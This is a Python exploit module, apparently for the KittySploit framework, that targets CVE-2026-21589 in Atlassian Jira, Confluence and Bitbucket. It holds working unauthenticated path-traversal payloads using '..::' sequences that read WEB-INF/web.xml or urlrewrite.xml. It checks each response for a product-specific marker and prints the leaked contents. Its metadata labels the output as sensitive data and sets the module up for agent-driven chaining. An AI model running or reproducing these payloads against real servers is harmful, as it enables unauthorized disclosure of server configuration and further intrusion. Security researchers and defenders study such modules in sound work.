#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-21589 — read protected WEB-INF files via webresource traversal."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Atlassian CVE-2026-21589 WEB-INF file read",
        "description": (
            "Reads web.xml / urlrewrite.xml from Jira, Confluence, or Bitbucket "
            "through unauthenticated /download/resources/ :: traversal."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-21589"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-21589",
        ],
        "tags": ["atlassian", "lfi", "unauth", "cve-2026-21589", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["sensitive_data"],
            "chain": {
                "suggested_followups": ["scanner/http/atlassian_cve_2026_21589_detect"],
            },
        },
    }

    _PROBES = (
        (
            "jira",
            "download/resources/jira.webresources:color-picker-popup/images/"
            "..::..::..::..::..::WEB-INF::web.xml",
            "com.atlassian.jira.web.ServletContextProviderListener",
        ),
        (
            "confluence",
            "s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/"
            "..::..::..::..::..::..::..::..::WEB-INF::web.xml",
            "com.atlassian.confluence.impl.webapp.ServletsInitializer",
        ),
        (
            "bitbucket",
            "s/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:"
            "avatar/avatar/..::..::..::..::..::WEB-INF::urlrewrite.xml",
            "com.atlassian.plugin.servlet.ResourceDownloadUtils",
        ),
    )

    def run(self):
        for product, path, marker in self._PROBES:
            r = self.http_request(method="GET", path=f"/{path}", allow_redirects=False)
            if not r or int(r.status_code) != 200:
                continue
            body = r.text or ""
            if marker not in body:
                continue
            snippet = body[:1200].strip()
            print_success(f"CVE-2026-21589 — {product} WEB-INF disclosure")
            print_status(snippet[:800])
            self.set_info(
                severity="critical",
                cve="CVE-2026-21589",
                product=product,
                disclosure_bytes=len(body),
            )
            return True
        print_error("No Atlassian webresource traversal hit (patched or unknown product path)")
        return False